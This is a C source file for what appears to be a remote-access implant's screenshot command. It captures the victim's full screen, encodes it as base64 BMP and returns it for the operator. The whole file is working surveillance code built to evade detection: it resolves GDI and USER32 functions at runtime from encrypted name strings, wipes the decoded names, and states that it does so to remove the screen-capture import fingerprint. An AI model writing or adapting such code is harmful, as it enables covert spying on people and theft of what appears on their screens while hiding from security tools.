#include "commands.h"
#include "crypto.h"
#include "evs_strings.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Dynamic GDI/USER32 dispatch — removes screen-capture IAT fingerprint ─── */

typedef HDC    (WINAPI *pGetDC_t)                (HWND);
typedef int    (WINAPI *pReleaseDC_t)            (HWND, HDC);
typedef int    (WINAPI *pGetDeviceCaps_t)        (HDC, int);
typedef HDC    (WINAPI *pCreateCompatibleDC_t)   (HDC);
typedef HBITMAP(WINAPI *pCreateCompatibleBitmap_t)(HDC, int, int);
typedef HGDIOBJ(WINAPI *pSelectObject_t)         (HDC, HGDIOBJ);
typedef BOOL   (WINAPI *pBitBlt_t)               (HDC,int,int,int,int,HDC,int,int,DWORD);
typedef BOOL   (WINAPI *pStretchBlt_t)           (HDC,int,int,int,int,HDC,int,int,int,int,DWORD);
typedef BOOL   (WINAPI *pDeleteDC_t)             (HDC);
typedef BOOL   (WINAPI *pDeleteObject_t)         (HGDIOBJ);
typedef HGDIOBJ(WINAPI *pGetStockObject_t)       (int);
typedef int    (WINAPI *pSetStretchBltMode_t)    (HDC, int);
typedef BOOL   (WINAPI *pSetBrushOrgEx_t)        (HDC, int, int, POINT *);
typedef int    (WINAPI *pGetDIBits_t)            (HDC,HBITMAP,UINT,UINT,LPVOID,LPBITMAPINFO,UINT);

typedef struct {
    pGetDC_t                 GetDC;
    pReleaseDC_t             ReleaseDC;
    pGetDeviceCaps_t         GetDeviceCaps;
    pCreateCompatibleDC_t    CreateCompatibleDC;
    pCreateCompatibleBitmap_t CreateCompatibleBitmap;
    pSelectObject_t          SelectObject;
    pBitBlt_t                BitBlt;
    pStretchBlt_t            StretchBlt;
    pDeleteDC_t              DeleteDC;
    pDeleteObject_t          DeleteObject;
    pGetStockObject_t        GetStockObject;
    pSetStretchBltMode_t     SetStretchBltMode;
    pSetBrushOrgEx_t         SetBrushOrgEx;
    pGetDIBits_t             GetDIBits;
} ss_api_t;

static ss_api_t _ss = {0};

static int _ss_init(void)
{
    if (_ss.BitBlt) return 0;

    char _fn[32];

#define _DEC_GPA(dll, enc, dst) do { \
    EVS_D(_fn, enc); \
    (dst) = (void *)GetProcAddress(dll, _fn); \
    SecureZeroMemory(_fn, sizeof(enc) + 1); } while(0)

    char _dll[12];
    EVS_D(_dll, EVS_dll_gdi32);
    HMODULE hg = LoadLibraryA(_dll);
    SecureZeroMemory(_dll, sizeof(_dll));

    char _udll[12];
    EVS_D(_udll, EVS_dll_user32);
    HMODULE hu = LoadLibraryA(_udll);
    SecureZeroMemory(_udll, sizeof(_udll));

    if (!hg || !hu) return -1;

    _DEC_GPA(hu, EVS_fn_GetDC,                _ss.GetDC);
    _DEC_GPA(hu, EVS_fn_ReleaseDC,            _ss.ReleaseDC);
    _DEC_GPA(hg, EVS_fn_GetDeviceCaps,        _ss.GetDeviceCaps);
    _DEC_GPA(hg, EVS_fn_CreateCompatibleDC,   _ss.CreateCompatibleDC);
    _DEC_GPA(hg, EVS_fn_CreateCompatibleBitmap, _ss.CreateCompatibleBitmap);
    _DEC_GPA(hg, EVS_fn_SelectObject,         _ss.SelectObject);
    _DEC_GPA(hg, EVS_fn_BitBlt,               _ss.BitBlt);
    _DEC_GPA(hg, EVS_fn_StretchBlt,           _ss.StretchBlt);
    _DEC_GPA(hg, EVS_fn_DeleteDC,             _ss.DeleteDC);
    _DEC_GPA(hg, EVS_fn_DeleteObject,         _ss.DeleteObject);
    _DEC_GPA(hg, EVS_fn_GetStockObject,       _ss.GetStockObject);
    _DEC_GPA(hg, EVS_fn_SetStretchBltMode,    _ss.SetStretchBltMode);
    _DEC_GPA(hg, EVS_fn_SetBrushOrgEx,        _ss.SetBrushOrgEx);
    _DEC_GPA(hg, EVS_fn_GetDIBits,            _ss.GetDIBits);
#undef _DEC_GPA

    return _ss.BitBlt ? 0 : -1;
}

int cmd_screenshot(char *output_buf, size_t output_size)
{
    if (!output_buf || output_size < 128) return -1;
    output_buf[0] = '\0';

    if (_ss_init() != 0) {
        snprintf(output_buf, output_size, "e:gdi\n");
        return -1;
    }

    HDC hdc_screen = _ss.GetDC(NULL);
    if (!hdc_screen) {
        snprintf(output_buf, output_size,
                 "e:dc %lu\n", GetLastError());
        return -1;
    }

    int src_w = _ss.GetDeviceCaps(hdc_screen, HORZRES);
    int src_h = _ss.GetDeviceCaps(hdc_screen, VERTRES);
    if (src_w <= 0 || src_h <= 0) {
        _ss.ReleaseDC(NULL, hdc_screen);
        snprintf(output_buf, output_size, "e:caps\n");
        return -1;
    }

#define SS_MAX_BMP_BYTES (6u * 1024u * 1024u)
    int sw = src_w, sh = src_h;
    while ((size_t)(((sw * 3u + 3u) & ~3u)) * (size_t)sh > SS_MAX_BMP_BYTES) {
        sw = (sw * 3) / 4;
        sh = (sh * 3) / 4;
        if (sw < 320) { sw = 320; sh = 240; break; }
    }

    HDC hdc_cap = _ss.CreateCompatibleDC(hdc_screen);
    if (!hdc_cap) {
        _ss.ReleaseDC(NULL, hdc_screen);
        snprintf(output_buf, output_size, "e:cdc\n");
        return -1;
    }
    HBITMAP hbmp_cap = _ss.CreateCompatibleBitmap(hdc_screen, src_w, src_h);
    if (!hbmp_cap) {
        _ss.DeleteDC(hdc_cap); _ss.ReleaseDC(NULL, hdc_screen);
        snprintf(output_buf, output_size, "e:cbm\n");
        return -1;
    }
    _ss.SelectObject(hdc_cap, hbmp_cap);
    _ss.BitBlt(hdc_cap, 0, 0, src_w, src_h, hdc_screen, 0, 0, SRCCOPY | CAPTUREBLT);
    _ss.ReleaseDC(NULL, hdc_screen);

    HBITMAP hbmp_final;
    if (sw == src_w && sh == src_h) {
        _ss.SelectObject(hdc_cap, _ss.GetStockObject(NULL_BRUSH));
        hbmp_final = hbmp_cap;
        _ss.DeleteDC(hdc_cap);
    } else {
        HDC hdc_scale = _ss.CreateCompatibleDC(hdc_cap);
        hbmp_final = _ss.CreateCompatibleBitmap(hdc_cap, sw, sh);
        if (!hdc_scale || !hbmp_final) {
            if (hdc_scale) _ss.DeleteDC(hdc_scale);
            if (hbmp_final) _ss.DeleteObject(hbmp_final);
            _ss.SelectObject(hdc_cap, _ss.GetStockObject(NULL_BRUSH));
            _ss.DeleteObject(hbmp_cap); _ss.DeleteDC(hdc_cap);
            snprintf(output_buf, output_size, "e:sc\n");
            return -1;
        }
        HGDIOBJ old_sc = _ss.SelectObject(hdc_scale, hbmp_final);
        _ss.SetStretchBltMode(hdc_scale, HALFTONE);
        _ss.SetBrushOrgEx(hdc_scale, 0, 0, NULL);
        _ss.StretchBlt(hdc_scale, 0, 0, sw, sh,
                       hdc_cap,   0, 0, src_w, src_h, SRCCOPY);
        _ss.SelectObject(hdc_scale, old_sc);
        _ss.DeleteDC(hdc_scale);
        _ss.SelectObject(hdc_cap, _ss.GetStockObject(NULL_BRUSH));
        _ss.DeleteObject(hbmp_cap);
        _ss.DeleteDC(hdc_cap);
    }

    BITMAPINFOHEADER bih;
    memset(&bih, 0, sizeof(bih));
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = sw;
    bih.biHeight      = sh;
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    DWORD row_stride = (((DWORD)sw * 3u) + 3u) & ~3u;
    DWORD pixel_sz   = row_stride * (DWORD)sh;
    bih.biSizeImage   = pixel_sz;

    uint8_t *pixels = (uint8_t *)calloc(1, pixel_sz);
    if (!pixels) {
        _ss.DeleteObject(hbmp_final);
        snprintf(output_buf, output_size, "e:px\n");
        return -1;
    }

    HDC hdc_ref = _ss.GetDC(NULL);
    int lines = _ss.GetDIBits(hdc_ref, hbmp_final, 0, (UINT)sh, pixels,
                               (BITMAPINFO *)&bih, DIB_RGB_COLORS);
    _ss.ReleaseDC(NULL, hdc_ref);
    _ss.DeleteObject(hbmp_final);

    if (!lines) {
        free(pixels);
        snprintf(output_buf, output_size, "e:dib %lu\n", GetLastError());
        return -1;
    }

    DWORD pixel_offset = 14u + (DWORD)sizeof(BITMAPINFOHEADER);
    DWORD bmp_sz       = pixel_offset + pixel_sz;

    uint8_t *bmp = (uint8_t *)malloc(bmp_sz);
    if (!bmp) {
        free(pixels);
        snprintf(output_buf, output_size, "e:bm\n");
        return -1;
    }

    bmp[0] = 'B'; bmp[1] = 'M';
    memcpy(bmp + 2,  &bmp_sz,       4);
    memset(bmp + 6,  0,             4);
    memcpy(bmp + 10, &pixel_offset, 4);
    memcpy(bmp + 14, &bih,          sizeof(BITMAPINFOHEADER));
    memcpy(bmp + pixel_offset, pixels, pixel_sz);
    free(pixels);

    char *b64 = base64_encode(bmp, bmp_sz);
    free(bmp);
    if (!b64) {
        snprintf(output_buf, output_size, "e:b64\n");
        return -1;
    }

    int header_len = snprintf(output_buf, output_size, "ss:%dx%d\n", sw, sh);
    if (header_len < 0 || (size_t)header_len >= output_size) {
        free(b64);
        snprintf(output_buf, output_size, "e:hdr\n");
        return -1;
    }

    size_t remaining = output_size - (size_t)header_len - 1;
    size_t b64_len = strlen(b64);
    if (b64_len > remaining) b64_len = remaining;

    memcpy(output_buf + header_len, b64, b64_len);
    output_buf[header_len + b64_len] = '\0';
    free(b64);
    return 0;
}
